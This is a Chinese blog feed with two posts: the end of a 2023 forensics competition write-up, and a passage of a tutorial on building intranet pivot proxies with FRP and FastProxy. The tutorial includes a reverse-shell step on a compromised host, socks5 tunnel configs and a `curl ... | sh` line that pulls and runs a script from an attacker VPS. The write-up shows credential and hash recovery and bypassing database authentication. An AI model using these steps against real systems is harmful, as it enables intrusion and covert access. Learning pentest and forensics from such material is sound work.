src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016081948-w564puz.png" alt="image">​</p><h3 id="12、给出pc-e01在提取时候的检查员？-答案格式：admin"><a href="#12、给出pc-e01在提取时候的检查员？-答案格式：admin" class="headerlink" title="12、给出pc.e01在提取时候的检查员？[答案格式：admin]"></a><strong>12、给出pc.e01在提取时候的检查员？[答案格式：admin]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230915125319-94w467w.png" alt="image">​</p><p>pgs</p><h3 id="13、请给出嫌疑人计算机内IE浏览器首页地址？-答案格式：http-www-baidu-com"><a href="#13、请给出嫌疑人计算机内IE浏览器首页地址？-答案格式：http-www-baidu-com" class="headerlink" title="13、请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：http://www.baidu.com]"></a><strong>13、请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：<a href="http://www.baidu.com]">http://www.baidu.com]</a></strong></h3><p><a href="http://global.bing.com/?scope=web&mkt=en-US&FORM=QBRE">http://global.bing.com/?scope=web&amp;mkt=en-US&amp;FORM=QBRE</a></p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016082048-sy1ga3z.png" alt="image">​</p><h3 id="14-【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？-答案格式：root-admin"><a href="#14-【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？-答案格式：root-admin" class="headerlink" title="14.【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root&#x2F;admin]"></a>14.【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root&#x2F;admin]</h3><table><thead><tr><th>yang88</th><th>3w.qax.com</th></tr></thead></table><p>打开火眼仿真直接得到密码</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016075408-qoinjjn.png" alt="image">​</p><h3 id="15-【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？-答案格式：xxxx-xx"><a href="#15-【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？-答案格式：xxxx-xx" class="headerlink" title="15.【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]"></a>15.【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016081353-0z6g2y2.png" alt="image">​</p><h3 id="16-【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？-答案格式：字母小写"><a href="#16-【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？-答案格式：字母小写" class="headerlink" title="16.【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]"></a>16.【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]</h3><p>仿真后取出D盘下面的镜像文件，导入火眼</p><p>计算hashfile</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016082731-wj466ul.png" alt="image">​</p><p>24CFCFDF1FA894244F904067838E7E01E28FF450</p><h3 id="17-【计算机取证】请给出嫌疑人Vera-Crypt加密容器的解密密码？-答案格式：admin"><a href="#17-【计算机取证】请给出嫌疑人Vera-Crypt加密容器的解密密码？-答案格式：admin" class="headerlink" title="17.【计算机取证】请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]"></a>17.【计算机取证】请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]</h3><p>直接搜索密码</p><p>3w.qax.com!!@@</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016083214-cbg0uo7.png" alt="image">​</p><h3 id="18-【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？-答案格式：8080"><a href="#18-【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？-答案格式：8080" class="headerlink" title="18.【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]"></a>18.【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]</h3><p>直接搜ISCSI会看到3260端口</p><p>如果不细心的话直接看可能就是会选择这个端口</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016083821-45xnsmq.png" alt="image">​</p><p>需要通过端口进程查看pid转到这个程序，然后打开可以看见开放端口</p><h3 id="19-【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？-答案格式：root-admin"><a href="#19-【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？-答案格式：root-admin" class="headerlink" title="19.【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root&#x2F;admin]"></a>19.【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root&#x2F;admin]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016084014-761fl7y.png" alt="image">​</p><p>点击连接后看不到密码</p><p>需要找配置文件</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016084539-iuj9mn0.png" alt="image">​</p><p>先找exe文件，同路径下面有配置文件：</p><p>cfg是一种配置文件的后缀，可以打开看看</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016084603-x2wihti.png" alt="image">​</p><p>直接打开</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016084641-zam2roa.png" alt="image">​</p><p>搜索可以看到密码</p><p>‍</p><h3 id="20-【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？-答案格式：10000"><a href="#20-【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？-答案格式：10000" class="headerlink" title="20.【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]"></a>20.【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]</h3><p>分析另一个内存镜像</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016100240-28g3yqr.png" alt="image">​</p><p>可以看到有疑似var加密的容器，拖出来解密就有这个文档</p><p>用火眼看：</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016101931-k0n7xn9.png" alt="image">​</p><p>也可以看到一个txt有两个g，难免会让人起疑</p><p>挂载后里面有很多个xls，看提<code>现记录.xls</code>​算答案</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016092742-8uy042j.png" alt="image">​</p><p>排序、求和</p><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="21【内存取证】请给出计算机内存创建北京时间？-答案格式：2000-01-11-00-00-00"><a href="#21【内存取证】请给出计算机内存创建北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="21【内存取证】请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]"></a>21【内存取证】请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016090802-vyd5dod.png" alt="image">​</p><h3 id="22-【内存取证】请给出计算机内用户yang88的开机密码？-答案格式：abc-123"><a href="#22-【内存取证】请给出计算机内用户yang88的开机密码？-答案格式：abc-123" class="headerlink" title="22.【内存取证】请给出计算机内用户yang88的开机密码？[答案格式：abc.123]"></a>22.【内存取证】请给出计算机内用户yang88的开机密码？[答案格式：abc.123]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016094944-ihhr1ol.png" alt="image">​</p><h3 id="23-【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？-答案格式：2000-01-11-00-00-00"><a href="#23-【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="23.【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11 00:00:00]"></a>23.【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11 00:00:00]</h3><p>用取证大师就是直接看，这里答案是选择首次插拔时间</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016100128-vgov2w4.png" alt="image">​</p><h3 id="24-【内存取证】请给出用户yang88的LMHASH值？-答案格式：字母小写"><a href="#24-【内存取证】请给出用户yang88的LMHASH值？-答案格式：字母小写" class="headerlink" title="24.【内存取证】请给出用户yang88的LMHASH值？[答案格式：字母小写]"></a>24.【内存取证】请给出用户yang88的LMHASH值？[答案格式：字母小写]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016100546-ws6xvlg.png" alt="image">​</p><p>yang88:1000:<strong>aad3b435b51404eeaad3b435b51404ee</strong>:46e5597f00c98ae6cf3917b07bcc00be:::</p><h3 id="25-【内存取证】请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？-答案格式：2000-01-11-00-00-00"><a href="#25-【内存取证】请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="25.【内存取证】请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11 00:00:00]"></a>25.【内存取证】请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11 00:00:00]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016100852-s06kcuk.png" alt="image">​</p><h3 id="26-【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？-答案格式：2000-01-11-00-00-00"><a href="#26-【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="26.【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]"></a>26.【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016102323-funzmat.png" alt="image">​</p><p>2023-06-20 16:47:41 UTC+0000</p><p>转成北京时间</p><p>2023-06-21 0:47:41</p><h3 id="27-【内存取证】分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？-答案格式-10"><a href="#27-【内存取证】分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？-答案格式-10" class="headerlink" title="27.【内存取证】分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]"></a>27.【内存取证】分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016102703-hlykh57.png" alt="image">​</p><p>2次</p><h3 id="28-【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？-答案格式：1234"><a href="#28-【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？-答案格式：1234" class="headerlink" title="28.【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]"></a>28.【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016102808-2njyx76.png" alt="image">​</p><p>2456</p><h2 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a>服务器取证</h2><h3 id="29-【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？-答案格式：xx-xxx-xxx-xx-xx"><a href="#29-【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？-答案格式：xx-xxx-xxx-xx-xx" class="headerlink" title="29.【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]"></a>29.【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016103122-3615egz.png" alt="image">​</p><h3 id="30-【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？-答案格式：Admin123"><a href="#30-【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？-答案格式：Admin123" class="headerlink" title="30.【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]"></a>30.【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016103741-rkgj276.png" alt="image">​</p><p>服务器仿真后找密码</p><h3 id="31-【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？-答题格式-xx-xx-xx-xx-xx-xx"><a href="#31-【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？-答题格式-xx-xx-xx-xx-xx-xx" class="headerlink" title="31.【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]"></a>31.【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016104002-xfi0avo.png" alt="image">​</p><h3 id="32-【服务器取证】请给出涉网网站数据库版本号-答题格式-5-6-00"><a href="#32-【服务器取证】请给出涉网网站数据库版本号-答题格式-5-6-00" class="headerlink" title="32.【服务器取证】请给出涉网网站数据库版本号? [答题格式: 5.6.00]"></a>32.【服务器取证】请给出涉网网站数据库版本号? [答题格式: 5.6.00]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016104050-cl03p27.png" alt="image">​</p><h3 id="33-【服务器取证】请给出嫌疑人累计推广人数？-答案格式：100"><a href="#33-【服务器取证】请给出嫌疑人累计推广人数？-答案格式：100" class="headerlink" title="33.【服务器取证】请给出嫌疑人累计推广人数？[答案格式：100]"></a>33.【服务器取证】请给出嫌疑人累计推广人数？[答案格式：100]</h3><p>重置密码，查看面板信息得到随机码进入后台</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016104935-81v4pou.png" alt="image">​</p><p>看数据库密码：</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231016105812-ajkp7vy.png" alt="image">​</p><p>刚才有一个root的数据库密码但是连接不上，只能用宝塔页面的，但是我们也可以修改配置文件，让他不用密码验证即可，下面会提到</p><p>恢复数据库文件</p><h4 id="安装qpress"><a href="#安装qpress" class="headerlink" title="安装qpress"></a>安装qpress</h4><pre class=" language-xml"><code class="language-xml">wget "http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/attach/183466/cn_zh/1608011575185/qpress-11-linux-x64.tar"tar xvf qpress-11-linux-x64.tarchmod 775 qpresscp qpress /usr/bin</code></pre><h4 id="安装xtrabackup"><a href="#安装xtrabackup" class="headerlink" title="安装xtrabackup"></a>安装xtrabackup</h4><pre class=" language-xml"><code class="language-xml">wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpmyum install -y percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm处理文件：cat qp.xb | xbstream -x -v -C /www/server/data# 这里的qp.xb就是附件给的文件导入mysqlcd /www/server/datainnobackupex --decompress --remove-original /www/server/datainnobackupex --defaults-file=/etc/my.cnf --apply-log /www/server/datachown -R mysql:mysql /www/server/data</code></pre><p>‍</p><p>数据库文件配置：（在mysqld模块增加2，3行两条语句）</p><pre class=" language-xml"><code class="language-xml">[mysqld]lower_case_table_names=1 # 忽略大小写skip-grant-tables 跳过登录认证</code></pre><p>重启mysql后即可登录</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101103251-22yglsw.png" alt="image">​</p><p>&#x2F;www&#x2F;wwwroot&#x2F;v9.licai.com&#x2F;app&#x2F;Http&#x2F;Controllers&#x2F;Admin&#x2F;LoginController.php修改后台登录逻辑：</p><p>​​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101125444-322id0d.png" alt="image">​​</p><p>这个地址是之前做分析浏览器访问后台得到的地址<a href="http://192.168.120.131:8083/AdmanV9YY/Login">http://192.168.120.131:8083/AdmanV9YY/Login</a></p><p>修改.env：</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101125702-4wszrku.png" alt="image">​</p><p>地址全改成localhost或者127.0.0.1</p><p>利用admin&#x2F;123456登录即可</p><p>​​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101110810-jdsm686.png" alt="image">​​</p><h3 id="34、请给出涉案网站后台启用的超级管理员-答题格式-abc"><a href="#34、请给出涉案网站后台启用的超级管理员-答题格式-abc" class="headerlink" title="34、请给出涉案网站后台启用的超级管理员?[答题格式:abc]"></a><strong>34、请给出涉案网站后台启用的超级管理员?[答题格式:abc]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101110844-5loh18l.png" alt="image">​</p><p>只有admin是启用的</p><h3 id="35、投资项目“贵州六盘水市风力发电基建工程”的日化收益为？-答题格式-1-00"><a href="#35、投资项目“贵州六盘水市风力发电基建工程”的日化收益为？-答题格式-1-00" class="headerlink" title="35、投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]"></a><strong>35、投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101111013-up24i1x.png" alt="image">​</p><h3 id="36、最早访问涉案网站后台的IP地址为-答题格式-8-8-8-8"><a href="#36、最早访问涉案网站后台的IP地址为-答题格式-8-8-8-8" class="headerlink" title="36、最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]"></a><strong>36、最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101111046-ui684be.png" alt="image">​</p><h3 id="37、分析涉案网站数据库或者后台VIP2的会员有多少个-答案格式-100"><a href="#37、分析涉案网站数据库或者后台VIP2的会员有多少个-答案格式-100" class="headerlink" title="37、分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]"></a><strong>37、分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101111135-wsbz6jn.png" alt="image">​</p><p>刚好两页20个</p><p>‍</p><h3 id="38、分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为-答题格式-8"><a href="#38、分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为-答题格式-8" class="headerlink" title="38、分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]"></a><strong>38、分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]</strong></h3><p>2</p><p>‍</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101111532-t6zsv2e.png" alt="image">​</p><p>‍</p><h3 id="39、分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？-答题格式-10000-00"><a href="#39、分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？-答题格式-10000-00" class="headerlink" title="39、分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]"></a><strong>39、分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]</strong></h3><pre class=" language-xml"><code class="language-xml">128457.00</code></pre><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101111717-2xwx66a.png" alt="image">​</p><h3 id="40-【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？-答题格式-123"><a href="#40-【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？-答题格式-123" class="headerlink" title="40.【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]"></a>40.【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]</h3><p>嫌疑人的推荐人</p><p>就是陈昊民的推荐人：</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101112522-7y6xwgm.png" alt="image">​</p><p>查id就是</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101112537-23x3xij.png" alt="image">​</p><p>yang88，推荐号：513935</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101112503-egg7vtx.png" alt="image">​</p><h3 id="41、分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？-答题格式-10"><a href="#41、分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？-答题格式-10" class="headerlink" title="41、分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]"></a><strong>41、分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]</strong></h3><pre class=" language-xml"><code class="language-xml">select count(*) as `total`,inviter from member GROUP BY inviter having total>2;</code></pre><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101120847-gebxgu4.png" alt="image">​</p><p>统计出一共60个</p><h3 id="42-【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为-答题格式-张三"><a href="#42-【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为-答题格式-张三" class="headerlink" title="42.【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]"></a>42.【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101123719-crolrm5.png" alt="image">​</p><p>后面加个order by即可</p><p>找到inviter是617624</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101124017-hhn6ijg.png" alt="image">​</p><p>再查询姓名：骆潇原</p><h3 id="43-【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱-答题格式-10-000-00"><a href="#43-【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱-答题格式-10-000-00" class="headerlink" title="43.【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00]"></a>43.【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00]</h3><p>把状态为+和-的想减即可：</p><pre class=" language-xml"><code class="language-xml">select sum(moneylog_money) from moneylog where moneylog_status = '+'select sum(moneylog_money) from moneylog where moneylog_status = '-'</code></pre><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101124952-uq1u6ou.png" alt="image">​</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101124940-1dfcdh2.png" alt="image">​</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20231101124934-utjqzx1.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网代理</title>
      <link href="/2023/06/06/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"/>
      <url>/2023/06/06/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>在了解内网代理之前我们需要知道，有的工具是用来创建代理隧道的，搭配配置代理的工具达到内网穿透的目的。简单点理解就是，创建代理工具是开凿一个水渠，而配置代理工具就是把水流引到想要的地方。</p><p>创建代理工具：</p><pre class=" language-xml"><code class="language-xml">FRP、Neo-reGeorg、Venom、NPS</code></pre><p>配置代理工具：</p><pre class=" language-xml"><code class="language-xml">SwitchyOmega（浏览器插件，适用于Linux和Windows）proxifier （配置系统代理或者应用代理，仅使用Windows）Proxychains（Kali的代理神器）</code></pre><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h3><p>下载地址：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>0.47的有Windows的：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423083504-2lof3by.png" alt="image">​</p><p>一般下载amd64就可以了</p><p>目录结构：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423083741-2t3lfok.png" alt="image"></p><p>各个文件的释义：</p><pre class=" language-xml"><code class="language-xml">frpc.exe（客户端）frpc.ini(客户端配置文件)frps.exe（服务端）frps.ini(服务端配置文件)</code></pre><h3 id="1-手搓"><a href="#1-手搓" class="headerlink" title="1.手搓"></a>1.手搓</h3><p>服务端：如果要打远程内网，服务端都是放在<code>VPS</code>​上的，<strong>保证服务端和客户端都能同时访问到这台VPS即可搭建代理隧道</strong></p><p>使用frp之前要配置好<code>frps.ini</code>​和<code>frpc.in</code>​</p><p>frpc.ini:</p><pre class=" language-xml"><code class="language-xml">[common]server_addr = 10.103.119.169server_port = 7000token = frpToken@admin2022[proxy]type = tcpplugin = socks5remote_port = 25599</code></pre><p>frps.ini:</p><pre class=" language-xml"><code class="language-xml">[common]## 一、服务器的基本配置部分## 7000 是FRP服务端口，可以改bind_port = 7000## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。dashboard_user = admindashboard_pwd = frpadmin@2022## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆dashboard_port = 25500## 服务器和客户机之间的心跳连接heartbeat_timeout = 30#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求token=frpToken@admin2022</code></pre><p>服务端：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605210251-0fimss9.png" alt="image">​</p><p>客户端：</p><p>客户端先反弹一个shell，否则蚁剑的webshell不支持一直运行一个程序</p><p>反弹shell之后要记得chmod 777 frpc</p><p>给程序赋权之后就可以运行了</p><p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605210319-2zgrxcw.png" alt="image">​​</p><p>手搓的话代理就是开在 <code>vpsIP:25599</code>​了</p><p>访问<code>http://serverip:25500/</code>​ 可以看到配置情况：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605211740-38bd9ac.png" alt="image">​</p><p>这样子就算搭建好一个socks5隧道。当然了，上面只是最简单的例子，并没有设置密码等功能。</p><h3 id="​SwitchyOmega​​配置代理"><a href="#​SwitchyOmega​​配置代理" class="headerlink" title="​SwitchyOmega​​配置代理"></a>​<code>SwitchyOmega</code>​​配置代理</h3><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605210802-fib2enz.png" alt="image">​</p><p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605210627-myxj9nq.png" alt="image">​​</p><h3 id="2-工具"><a href="#2-工具" class="headerlink" title="2.工具"></a>2.工具</h3><p>工具很简单，也是在frp基础上为了更好地利用frp开发的</p><p>地址：<code>https://github.com/LxxxSec/FastProxy</code>​</p><p>这种方法只适用于<code>linux</code>​客户端</p><p>利用方式很简单，在vps上面运行（服务端）：</p><pre class=" language-bash"><code class="language-bash">python3 app.py vpsip 12345</code></pre><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423100855-8gywimb.png" alt="image">​</p><p>‍</p><p>然后在客户端（靶机）运行：</p><pre class=" language-bash"><code class="language-bash">curl http://123.249.8.26:12345/hack -s <span class="token operator">|</span> sh <span class="token operator">&amp;</span></code></pre><p>就是python开启的服务端中第一个[+]里面提示的东西</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423101000-4exoztz.png" alt="image">​</p><p>这样子就算搭建好了内网代理</p><p>这里搭建的代理有秘密，账号密码是 <code>admin/password</code>​</p><h3 id="kali配置代理："><a href="#kali配置代理：" class="headerlink" title="kali配置代理："></a>kali配置代理：</h3><pre class=" language-bash"><code class="language-bash">gedit 